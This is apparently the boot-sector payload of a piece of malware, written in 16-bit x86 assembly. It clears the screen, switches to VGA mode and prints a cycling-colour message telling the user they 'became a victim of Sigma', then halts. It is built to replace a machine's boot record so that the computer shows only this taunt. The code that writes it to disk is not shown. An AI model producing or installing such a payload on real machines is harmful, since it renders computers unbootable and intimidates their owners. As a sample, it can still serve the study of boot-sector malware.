BITS 16
ORG 0x7C00

start:
    mov ah, 0x07 ; scroll down window
    mov al, 0x00 ; clear screen
    mov dh, 0x18 ; lower row
    mov dl, 0x50 ; right column
    int 0x10     ; BIOS interrupt call

    mov ah, 0x01   ; set cursor shape
    mov cx, 0x2607 ; invisible cursor
    int 0x10       ; BIOS interrupt call

    mov ah, 0x00 ; set video mode
    mov al, 0x13 ; VGA color palette
    int 0x10     ; BIOS interrupt call

    mov si, msg ; move msg to Source Index

    mov cl, 0x28 ; move 0x28 to CL

print:
    mov ah, 0x0E ; teletype output
    mov al, [si] ; character
    mov bh, 0x00 ; page number
    mov bl, cl   ; color
    int 0x10     ; BIOS interrupt call
    lodsb        ; load next byte
    hlt          ; halt

    inc cl       ; increase CL
    cmp cl, 0x37 ; check if CL is 0x37
    je reset     ; if yes then jump to reset

    cmp al, 0x00 ; check for 0x00 at the end of msg
    jne print    ; jump if not equal

end:
    hlt     ; halt
    jmp end ; jump to end in a loop

reset:
    mov cl, 0x20 ; reset the color back to 0x20
    jmp print    ; jump back to print

msg: db "You just became a victim of Sigma.",13,10,13,10,"Enjoy the hell.", 0x00

times 510 - ($ - $$) db 0
dw 0xAA55